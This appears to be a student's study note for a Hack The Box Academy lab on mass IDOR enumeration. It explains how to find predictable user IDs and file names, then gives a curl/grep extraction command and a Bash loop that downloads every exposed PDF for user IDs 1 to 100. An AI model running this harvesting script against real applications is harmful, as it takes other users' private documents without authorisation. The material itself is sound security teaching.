# Mass IDOR Enumeration - [LINK](https://academy.hackthebox.com/app/module/134/section/1186)

Insecure Direct Object References (IDOR) often allow for mass data harvesting when a web application uses predictable parameter values (like sequential `uid`s) without proper back-end access controls.

**Identifying Insecure Parameters**

* **Observe URL Parameters:** Look for identifiers in the URL, such as `documents.php?uid=1`.
* **Test for Access Control:** Increment or manipulate the parameter (e.g., `?uid=2`). Carefully inspect the page source or linked files. Even if the UI layout remains identical, the underlying links may point to a different user's resources.
* **Static File IDOR:** Pay attention to file naming conventions. If filenames follow a predictable pattern (e.g., `/documents/Invoice_2_08_2020.pdf` where `2` is the `uid`), you can brute-force the files directly without interacting with the application logic.

**Mass Enumeration & Automation**
Manually navigating through hundreds of user IDs is inefficient. Once an IDOR is confirmed, automate the extraction using native CLI tools or fuzzers (like Burp Intruder or ZAP).

**Step 1: Regex Link Extraction**
Use `curl` to fetch the target page and `grep` with Perl-compatible regular expressions (`-oP`) to isolate the exact file paths from the HTML source.

```bash
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

```

- In firefox use `CTRL + SHIFT + C` to enable the element inspector, and then click on any of the links to view their HTML source code.

**Step 2: Automated Mass Download Script**
Wrap the extraction command in a Bash `for` loop to iterate through a target range of user IDs. Use `wget` to download every exposed file silently.

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..100}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done

```
